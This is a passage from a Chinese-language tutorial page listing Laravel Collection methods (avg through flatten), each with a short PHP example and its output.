class="number">4</span>])-&gt;avg(); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>获取二维数组的平均值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">collect([[<span class="string">'foo'</span> =&gt; <span class="number">10</span>], [<span class="string">'foo'</span> =&gt; <span class="number">10</span>], [<span class="string">'foo'</span> =&gt; <span class="number">20</span>], [<span class="string">'foo'</span> =&gt; <span class="number">40</span>]])-&gt;avg(<span class="string">'foo'</span>); <span class="comment">// 20</span></span><br></pre></td></tr></table></figure><p><code>avg()</code>是<code>average()</code> 的别名，两者的效果是一样的。</p><h2 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h2><p>将大集合按指定大小拆分成小集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]);</span><br><span class="line">$chunks = $collection-&gt;chunk(<span class="number">4</span>);</span><br><span class="line">$chunks-&gt;toArray();</span><br><span class="line"><span class="comment">// [[1, 2, 3, 4], [5, 6, 7]]</span></span><br></pre></td></tr></table></figure><h2 id="chunkWhile"><a href="#chunkWhile" class="headerlink" title="chunkWhile"></a>chunkWhile</h2><p>根据指定的回调值把集合分解成多个更小的集合：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect(str_split(<span class="string">'AABBCCCD'</span>));</span><br><span class="line"></span><br><span class="line">$chunks = $collection-&gt;chunkWhile(<span class="function"><span class="keyword">function</span> <span class="params">($current, $key, $chunk)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $current === $chunk-&gt;last();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$chunks-&gt;all();</span><br><span class="line"><span class="comment">// [['A', 'A'], ['B', 'B'], ['C', 'C', 'C'], ['D']]</span></span><br></pre></td></tr></table></figure><h2 id="collapse"><a href="#collapse" class="headerlink" title="collapse"></a>collapse</h2><p>将多个数组合并成一个集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]);</span><br><span class="line"><span class="comment">// 注意这里返回了一个新的集合</span></span><br><span class="line">$collapsed = $collection-&gt;collapse();</span><br><span class="line">$collapsed-&gt;all();</span><br><span class="line"><span class="comment">// [1, 2, 3, 4, 5, 6, 7, 8, 9]</span></span><br></pre></td></tr></table></figure><h2 id="combine"><a href="#combine" class="headerlink" title="combine"></a>combine</h2><p>将一个集合的值作为「键」，再将另一个数组或者集合的值作为「值」合并成一个集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'name'</span>, <span class="string">'age'</span>]);</span><br><span class="line">$combined = $collection-&gt;combine([<span class="string">'boo'</span>, <span class="number">25</span>]);</span><br><span class="line">$combined-&gt;all();</span><br><span class="line"><span class="comment">// ['name' =&gt; 'boo', 'age' =&gt; 25]</span></span><br></pre></td></tr></table></figure><h2 id="collect"><a href="#collect" class="headerlink" title="collect"></a>collect</h2><p>返回一个包含当前集合所含元素的新的 Collection 实例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line">$collection-&gt;all(); </span><br><span class="line"><span class="comment">// [1,2,3]</span></span><br></pre></td></tr></table></figure><h2 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h2><p>在集合的末端附加指定的数组或集合值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'John Doe'</span>]);</span><br><span class="line">$concatenated = $collection-&gt;concat([<span class="string">'Boo'</span>])-&gt;concat([<span class="string">'name'</span> =&gt; <span class="string">'Yumi'</span>]);</span><br><span class="line">$concatenated-&gt;all();</span><br><span class="line"><span class="comment">// ['John Doe', 'Boo', 'Yumi']</span></span><br></pre></td></tr></table></figure><h2 id="contains"><a href="#contains" class="headerlink" title="contains"></a>contains</h2><p>判断集合是否包含给定的项目。</p><p>基本用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'name'</span> =&gt; <span class="string">'boo'</span>, <span class="string">'age'</span> =&gt; <span class="number">25</span>]);</span><br><span class="line">$collection-&gt;contains(<span class="string">'boo'</span>);  <span class="comment">// true</span></span><br><span class="line">$collection-&gt;contains(<span class="string">'yumi'</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>也可以用 contains 方法匹配一对键/值，即判断给定的配对是否存在于集合中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'boo'</span>, <span class="string">'age'</span> =&gt; <span class="number">25</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'yumi'</span>, <span class="string">'age'</span> =&gt; <span class="number">23</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;contains(<span class="string">"name"</span>, <span class="string">"mac"</span>);  <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>也可以传递一个回调到 contains 方法来执行自己的真实测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $value: 1 $key: 0</span></span><br><span class="line">$collection-&gt;contains(<span class="function"><span class="keyword">function</span> <span class="params">($value, $key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $value &gt; <span class="number">5</span>;</span><br><span class="line">&#125;); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>contains 方法在检查项目值时使用「宽松」比较，意味着具有整数值的字符串将被视为等于相同值的整数。 相反 containsStrict 方法则是使用「严格」比较进行过滤。</p><h2 id="containsStrict"><a href="#containsStrict" class="headerlink" title="containsStrict"></a>containsStrict</h2><p>使用「严格模式」判断集合是否包含给定的项目：</p><p>基本使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'boo'</span>, <span class="string">'age'</span> =&gt; <span class="number">25</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'yumi'</span>, <span class="string">'age'</span> =&gt; <span class="number">23</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;containsStrict(<span class="string">"age"</span>, <span class="string">"25"</span>);  <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>如上例所示，数组值存在，但是值类型不一致也返回false。</p><h2 id="count"><a href="#count" class="headerlink" title="count"></a>count</h2><p>返回该集合内的项目总数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])-&gt;count();  <span class="comment">// 4</span></span><br></pre></td></tr></table></figure><h2 id="countBy"><a href="#countBy" class="headerlink" title="countBy"></a>countBy</h2><p>统计集合中每个元素出现的次数。</p><p>基本用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">5</span>]);</span><br><span class="line">$counted = $collection-&gt;countBy();</span><br><span class="line">$counted-&gt;all();</span><br><span class="line"><span class="comment">// [1 =&gt; 1, 2 =&gt; 3, 3 =&gt; 1, 5=&gt;2]</span></span><br></pre></td></tr></table></figure><p>进阶用法，自定义规则，统计元素出现的次数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$collection &#x3D; collect([&#39;alice@gmail.com&#39;, &#39;bob@yahoo.com&#39;, &#39;carlos@gmail.com&#39;]);</span><br><span class="line">$counted &#x3D; $collection-&gt;countBy(function ($email) &#123;</span><br><span class="line">    return substr(strrchr($email, &quot;@&quot;), 1);</span><br><span class="line">&#125;);</span><br><span class="line">$counted-&gt;all();</span><br><span class="line">&#x2F;&#x2F; [&#39;gmail.com&#39; &#x3D;&gt; 2, &#39;yahoo.com&#39; &#x3D;&gt; 1]</span><br></pre></td></tr></table></figure><h2 id="crossJoin"><a href="#crossJoin" class="headerlink" title="crossJoin"></a>crossJoin</h2><p>返回指定集合的可能的笛卡尔积。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">$matrix = $collection-&gt;crossJoin([<span class="string">'a'</span>, <span class="string">'b'</span>]);</span><br><span class="line"></span><br><span class="line">$matrix-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        [1, 'a'],</span></span><br><span class="line"><span class="comment">        [1, 'b'],</span></span><br><span class="line"><span class="comment">        [2, 'a'],</span></span><br><span class="line"><span class="comment">        [2, 'b'],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">$matrix = $collection-&gt;crossJoin([<span class="string">'a'</span>, <span class="string">'b'</span>], [<span class="string">'I'</span>, <span class="string">'II'</span>]);</span><br><span class="line"></span><br><span class="line">$matrix-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        [1, 'a', 'I'],</span></span><br><span class="line"><span class="comment">        [1, 'a', 'II'],</span></span><br><span class="line"><span class="comment">        [1, 'b', 'I'],</span></span><br><span class="line"><span class="comment">        [1, 'b', 'II'],</span></span><br><span class="line"><span class="comment">        [2, 'a', 'I'],</span></span><br><span class="line"><span class="comment">        [2, 'a', 'II'],</span></span><br><span class="line"><span class="comment">        [2, 'b', 'I'],</span></span><br><span class="line"><span class="comment">        [2, 'b', 'II'],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="dd"><a href="#dd" class="headerlink" title="dd"></a>dd</h2><p>备份文件系统和停止系统（dump and die）的缩写，打印集合元素并中断脚本执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'John Doe'</span>, <span class="string">'Jane Doe'</span>]);</span><br><span class="line">$collection-&gt;dd();</span><br></pre></td></tr></table></figure><p>如果不想中断执行脚本，请使用<code>dump</code>方法替代。</p><h2 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h2><p>与给定的集合或者数组进行比较，基于值求差集。</p><p>将集合与其它集合或纯 PHP 数组进行值的比较，然后返回原集合中存在而给定集合中不存在的值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line">$collection-&gt;diff([<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>])-&gt;all();   <span class="comment">// [1, 3, 5]</span></span><br></pre></td></tr></table></figure><h2 id="diffAssoc"><a href="#diffAssoc" class="headerlink" title="diffAssoc"></a>diffAssoc</h2><p>与给定的集合或者数组进行比较，基于键值对求差集。</p><p>返回原集合不存在于给定集合中的键值对：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    <span class="string">'color'</span> =&gt; <span class="string">'orange'</span>,</span><br><span class="line">    <span class="string">'type'</span> =&gt; <span class="string">'fruit'</span>,</span><br><span class="line">    <span class="string">'remain'</span> =&gt; <span class="number">6</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$diff = $collection-&gt;diffAssoc([</span><br><span class="line">    <span class="string">'color'</span> =&gt; <span class="string">'yellow'</span>,</span><br><span class="line">    <span class="string">'type'</span> =&gt; <span class="string">'fruit'</span>,</span><br><span class="line">    <span class="string">'remain'</span> =&gt; <span class="number">3</span>,</span><br><span class="line">    <span class="string">'used'</span> =&gt; <span class="number">6</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$diff-&gt;all(); <span class="comment">// ['color' =&gt; 'orange', 'remain' =&gt; 6]</span></span><br></pre></td></tr></table></figure><h2 id="diffKeys"><a href="#diffKeys" class="headerlink" title="diffKeys"></a>diffKeys</h2><p>与给定的集合或者数组进行比较，基于键求差集。</p><p>返回原集合中存在而给定的集合中不存在「键」所对应的键值对：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    <span class="string">'one'</span> =&gt; <span class="number">10</span>,</span><br><span class="line">    <span class="string">'two'</span> =&gt; <span class="number">20</span>,</span><br><span class="line">    <span class="string">'three'</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    <span class="string">'four'</span> =&gt; <span class="number">40</span>,</span><br><span class="line">    <span class="string">'five'</span> =&gt; <span class="number">50</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$diff = $collection-&gt;diffKeys([</span><br><span class="line">    <span class="string">'two'</span> =&gt; <span class="number">2</span>,</span><br><span class="line">    <span class="string">'four'</span> =&gt; <span class="number">4</span>,</span><br><span class="line">    <span class="string">'six'</span> =&gt; <span class="number">6</span>,</span><br><span class="line">    <span class="string">'eight'</span> =&gt; <span class="number">8</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$diff-&gt;all(); <span class="comment">// ['one' =&gt; 10, 'three' =&gt; 30, 'five' =&gt; 50]</span></span><br></pre></td></tr></table></figure><h2 id="duplicates"><a href="#duplicates" class="headerlink" title="duplicates"></a>duplicates</h2><p>从集合中检索并返回重复的值。</p><p>基本用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'a'</span>, <span class="string">'c'</span>, <span class="string">'b'</span>]);</span><br><span class="line">$collection-&gt;duplicates();</span><br><span class="line"><span class="comment">// [2 =&gt; 'a', 4 =&gt; 'b']</span></span><br></pre></td></tr></table></figure><p>如果集合包含数组或对象，则可以传递希望检查重复值的属性的键：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$employees = collect([</span><br><span class="line">    [<span class="string">'email'</span> =&gt; <span class="string">'abigail@example.com'</span>, <span class="string">'position'</span> =&gt; <span class="string">'Developer'</span>],</span><br><span class="line">    [<span class="string">'email'</span> =&gt; <span class="string">'james@example.com'</span>, <span class="string">'position'</span> =&gt; <span class="string">'Designer'</span>],</span><br><span class="line">    [<span class="string">'email'</span> =&gt; <span class="string">'victoria@example.com'</span>, <span class="string">'position'</span> =&gt; <span class="string">'Developer'</span>],</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">$employees-&gt;duplicates(<span class="string">'position'</span>);</span><br><span class="line"><span class="comment">// [2 =&gt; 'Developer']</span></span><br></pre></td></tr></table></figure><p><code>duplicates</code> 方法在检查项目值时使用「宽松」比较，相反<code>duplicatesStrict</code> 方法则是使用「严格」比较进行过滤。</p><h2 id="each"><a href="#each" class="headerlink" title="each"></a>each</h2><p>迭代集合中的内容并将其传递到回调函数中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$collection = $collection-&gt;each(<span class="function"><span class="keyword">function</span> <span class="params">($item, $key)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 如果要中断对内容的迭代，那就从回调中返回 false</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="comment">/* some condition */</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="eachSpread"><a href="#eachSpread" class="headerlink" title="eachSpread"></a>eachSpread</h2><p>同样是遍历集合，不过与each 的区别在于，对于多维数组，可以直接拿到元素。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([[<span class="string">'Boo'</span>, <span class="number">25</span>, <span class="string">"men"</span>], [<span class="string">'Yumi'</span>, <span class="number">23</span>, <span class="string">"woman"</span>]]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;eachSpread(<span class="function"><span class="keyword">function</span> <span class="params">($name, $age, $gender)</span> </span>&#123;</span><br><span class="line">    var_dump($name, $age, $gender);</span><br><span class="line">    <span class="comment">// Boo、25、men</span></span><br><span class="line">    <span class="comment">// Yumi、23、woman</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$collection-&gt;each(<span class="function"><span class="keyword">function</span> <span class="params">($item, $key)</span></span>&#123;</span><br><span class="line">   <span class="comment">// 同样可以在回调函数中，返回false ，终止循环</span></span><br><span class="line">   var_dump($item, $key);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    array(3) &#123;</span></span><br><span class="line"><span class="comment">      [0]=&gt;</span></span><br><span class="line"><span class="comment">      string(3) "Boo"</span></span><br><span class="line"><span class="comment">      [1]=&gt;</span></span><br><span class="line"><span class="comment">      int(25)</span></span><br><span class="line"><span class="comment">      [2]=&gt;</span></span><br><span class="line"><span class="comment">      string(3) "men"</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="every"><a href="#every" class="headerlink" title="every"></a>every</h2><p>检查集合中的每一个元素是否通过指定条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">collect([1, 2, 3, 4])-&gt;every(function ($value, $key) &#123;</span><br><span class="line">    return $value &gt; 2;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; false</span><br></pre></td></tr></table></figure><p>注意：如果集合为空， every 将返回 true。</p><h2 id="except"><a href="#except" class="headerlink" title="except"></a>except</h2><p>返回集合中除了指定键以外的所有项目。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'product_id'</span> =&gt; <span class="number">1</span>, <span class="string">'price'</span> =&gt; <span class="number">100</span>, <span class="string">'discount'</span> =&gt; <span class="keyword">false</span>]);</span><br><span class="line">$filtered = $collection-&gt;except([<span class="string">'price'</span>, <span class="string">'discount'</span>]);</span><br><span class="line">$filtered-&gt;all(); <span class="comment">// ['product_id' =&gt; 1]</span></span><br></pre></td></tr></table></figure><p>与之相反的方法是 <code>only()</code>。</p><h2 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h2><p>使用给定的回调函数过滤集合的内容，只留下那些通过的元素。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]);</span><br><span class="line">$filtered = $collection-&gt;filter(<span class="function"><span class="keyword">function</span> <span class="params">($value, $key)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 当闭包返回true 时，保留一个条目</span></span><br><span class="line">    <span class="keyword">return</span> $value &gt; <span class="number">2</span>;</span><br><span class="line">&#125;);</span><br><span class="line">$filtered-&gt;all(); <span class="comment">// [3, 4]</span></span><br></pre></td></tr></table></figure><p>如果没有提供回调函数，集合中所有返回false的元素都会被移除：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="keyword">null</span>, <span class="keyword">false</span>, <span class="string">''</span>, <span class="number">0</span>, []]);</span><br><span class="line">$collection-&gt;filter()-&gt;all(); <span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure><p>与之相反的方法是 <code>reject()</code>。</p><h2 id="first"><a href="#first" class="headerlink" title="first"></a>first</h2><p>返回集合中的第一个元素。</p><p>基本用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])-&gt;first();  <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>同样可以传入回调函数，进行条件限制：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])-&gt;first(<span class="function"><span class="keyword">function</span> <span class="params">($value, $key)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 当闭包返回true 时，保留一个条目</span></span><br><span class="line">    <span class="keyword">return</span> $value &gt; <span class="number">2</span>;</span><br><span class="line">&#125;); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><p>如果需要返回最后一个元素可以使用<code>last()</code> 方法。</p><h2 id="firstWhere"><a href="#firstWhere" class="headerlink" title="firstWhere"></a>firstWhere</h2><p>返回集合中含有指定键 / 值对的第一个元素：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Regena'</span>, <span class="string">'age'</span> =&gt; <span class="keyword">null</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Linda'</span>, <span class="string">'age'</span> =&gt; <span class="number">14</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Diego'</span>, <span class="string">'age'</span> =&gt; <span class="number">23</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Linda'</span>, <span class="string">'age'</span> =&gt; <span class="number">84</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回name = Linda 的第一个元素</span></span><br><span class="line">$collection-&gt;firstWhere(<span class="string">'name'</span>, <span class="string">'Linda'</span>);</span><br><span class="line"><span class="comment">// ['name' =&gt; 'Linda', 'age' =&gt; 14]</span></span><br></pre></td></tr></table></figure><p>还可以在firstWhere 中使用算术运算符：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection-&gt;firstWhere(<span class="string">'age'</span>, <span class="string">'&gt;='</span>, <span class="number">18</span>);</span><br><span class="line"><span class="comment">// ['name' =&gt; 'Diego', 'age' =&gt; 23]</span></span><br></pre></td></tr></table></figure><p>和 where 方法一样，你可以将一个参数传递给 firstWhere 方法。在这种情况下， firstWhere 方法将返回指定键的值为「真」的第一个集合项：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection-&gt;firstWhere(<span class="string">'age'</span>);</span><br><span class="line"><span class="comment">// ['name' =&gt; 'Linda', 'age' =&gt; 14]</span></span><br></pre></td></tr></table></figure><h2 id="firstMap"><a href="#firstMap" class="headerlink" title="firstMap"></a>firstMap</h2><p>遍历集合并将其中的每个值传递到给定的回调。</p><p>可以通过回调修改每个值的内容再返回出来，从而形成一个新的被修改过内容的集合：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Sally'</span>],</span><br><span class="line">    [<span class="string">'school'</span> =&gt; <span class="string">'Arkansas'</span>],</span><br><span class="line">    [<span class="string">'age'</span> =&gt; <span class="number">28</span>]</span><br><span class="line">]);</span><br><span class="line">$flattened = $collection-&gt;flatMap(<span class="function"><span class="keyword">function</span> <span class="params">($values)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> array_map(<span class="string">'strtoupper'</span>, $values);</span><br><span class="line">&#125;);</span><br><span class="line">$flattened-&gt;all();</span><br><span class="line"><span class="comment">// ['name' =&gt; 'SALLY', 'school' =&gt; 'ARKANSAS', 'age' =&gt; '28'];</span></span><br></pre></td></tr></table></figure><h2 id="flatten"><a href="#flatten" class="headerlink" title="flatten"></a>flatten</h2><p>将多维集合转为一维。</p><p>基本用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 